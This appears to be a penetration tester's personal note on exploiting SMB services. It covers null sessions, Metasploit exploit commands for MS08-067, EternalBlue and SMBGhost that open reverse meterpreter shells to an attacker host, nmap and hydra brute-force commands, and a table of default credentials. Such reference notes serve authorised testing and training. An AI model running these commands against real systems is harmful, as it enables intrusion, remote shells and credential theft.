---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SMB/Exploitation
links: "[[SMB]]"
---

# Exploitation

## Checklist

> [!todo]

- [ ] [[Enumeration#RPCclient|RPCclient]]
    - [ ] [[Enumeration#Connect|Connect]]
- [ ] [[Usage#Smbclient|Smbclient]]
    - [ ] [[Usage#Connect|Connect]]
        - [ ] [[Usage#Linux|Linux]]
        - [ ] [[Usage#Windows|Windows]]
    - [ ] [[Usage#SMB Actions|Enumeration]]

- [ ] [[Exploitation#Metasploit|Metasploit]]
- [ ] [[Exploitation#Common Credentials|Common Credentials]]
- [ ] [[Exploitation#Brute Force|Brute Force]]
- [ ] [[Exploitation#EternalBlue|EternalBlue]]


<!-- SMB Null Session {{{-->
## SMB Null Session

An [SMB Null Session](https://hackviser.com/tactics/pentesting/services/smb#smb-null-session)
refers to an unauthenticated connection to an SMB server

[[Enumeration#RPCclient|RPCclient]]

```sh
rpcclient -U "" <target_ip>
```

[[Usage#smbclient|smbclient]]

```sh
smbclient -L //<target_ip> -N
```

[[Enumeration#SMBmap|SMBmap]]

```sh
smbmap -H <target_ip> -u "" -p ""
```

<!-- }}} -->

<!-- IPC$ Share {{{-->
## IPC$ Share

Access to the
[IPC$](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html#ipc-share)
share can be obtained through an anonymous null session.

> [!todo]

[[Enumeration#Enum4Linux-ng|Enum4Linux-ng]] can be utilized to interact
with the exposed services via named pipes.

<!-- }}} -->

<!-- Metasploit {{{-->
## Metasploit

Search for exploits with Metasploit

```sh
msf> search type:exploit platform:windows target:2008 smb
searchsploit microsoft smb
```

### CVE Exploits

#### MS08-067 (Netapi)

```sh
use exploit/windows/smb/ms08_067_netapi
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker-ip
exploit
```

#### MS17-010 (EternalBlue)

```sh
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker-ip
exploit
```

#### SMBGhost (CVE-2020-0796)

```sh
use exploit/windows/smb/cve_2020_0796_smbghost
set RHOSTS target.com
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST attacker-ip
exploit
```

<!-- }}} -->

<!-- Brute Force {{{-->
## Brute Force

### Nmap

Brute force SMB login with [[Nmap]]'s
[smb-brute](https://nmap.org/nsedoc/scripts/smb-brute.html)

```sh
nmap --script smb-brute -p 445 <target_ip>
```

### Hydra

Brute force SMB login with [[Hydra]]

```sh
hydra -l <target_user> -P <passwords.txt> <target_ip> smb -t 1
```

```sh
hydra -l administrator -P <passwords.txt> smb://<target_ip>
```

### Metasploit

```sh
use auxiliary/scanner/smb/smb_login
set RHOSTS target.com
set USER_FILE /path/to/users.txt
set PASS_FILE /path/to/passwords.txt
set STOP_ON_SUCCESS true
exploit
```

<!-- }}} -->

<!-- Common Credentials {{{-->
## Common Credentials

> [!danger]-
>
> | Username             | Password                                |
> | -------------------- | --------------------------------------- |
> | (blank)              | (blank)                                 |
> | guest                | (blank)                                 |
> | Administrator, admin | (blank), password, administrator, admin |
> | arcserve             | arcserve, backup                        |
> | tivoli, tmersrvd     | tivoli, tmersrvd, admin                 |
> | backupexec, backup   | backupexec, backup, arcada              |
> | test, lab, demo      | password, test, lab, demo               |
<!-- }}} -->

<!-- EternalBlue {{{-->
## EternalBlue

Some SMB versions may be vulnerable to RCE exploits such as
[EternalBlue](https://www.avast.com/c-eternalblue).

Metasploit has several [modules](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
for EternalBlue that can be used to validate and exploit the vulnerability.

```sh
nmap -A -p445 <target_ip>
```

<!-- }}} -->
